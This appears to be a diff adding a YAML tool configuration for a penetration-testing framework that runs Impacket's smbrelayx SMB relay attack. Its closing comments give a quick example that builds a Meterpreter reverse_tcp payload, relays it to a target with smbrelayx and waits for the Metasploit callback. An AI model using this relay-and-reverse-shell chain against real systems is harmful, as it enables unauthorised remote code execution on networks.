@@ -1,0 +1,57 @@
+tool author: "https://github.com/CoreSecurity/impacket"
+config_creator: "huber"
+tool_name: "smbrelay"
+simultaneous: True
+group_by: "target"
+targets:
+      special: "<your_ip_address>"
+command: "sudo <pythonv2_path> <impacket_path>examples/smbrelayx.py -domain <client_domain_fqdn> -outputfile OUTPUT_FOLDER"
+output_path: "output/attack/smbrelay/"
+tool_parser: "parsers.attack.smbrelay_parser.smbrelay_parser"
+check_already_run: False
+create_folder: True
+
+# Global Vars
+impacket_path: '$PENTEST_DIR$/impacket/'
+
+questions:
+      - question: "Impacket full path (ex. /pentest/impacket/)"
+        name: "impacket_path"
+        nullable: False
+        regex:
+        global: True
+        answers:
+          default: "/pentest/impacket/"
+          blank: "/pentest/impacket/"
+      - question: "Network Interface"
+        name: "your_ip_address"
+        nullable: False
+        options: "NETWORK_IP_ADDRESS"
+        regex:
+        global: True
+      - question: "Pythonv2 full path (ex. /usr/bin/python2.7)"
+        name: "pythonv2_path"
+        nullable: True
+        regex:
+        global: True
+        answers:
+            blank: "/usr/bin/python2.7"
+            default: "/usr/bin/python2.7"
+      - question: "Client domain (FQDN)"
+        name: "client_domain_fqdn"
+        nullable: False
+        regex:
+        global: False
+selections:
+    - table: "Scope"
+      name: "scope_entry"
+      display_fields:
+        - "entry"
+        - "Location.name"
+      return_field: "id"
+      filter: "CURRENT_LOCATION"
+
+# Quick example
+#msfpayload -p windows/meterpreter/reverse_tcp LHOST=10.1.1.1 LPORT=8080 X > smb_rev.exe
+#python smbrelayx.py -h host_to_target -e ./smb_rev.exe
+# Start up metasploit and wait until gets call back
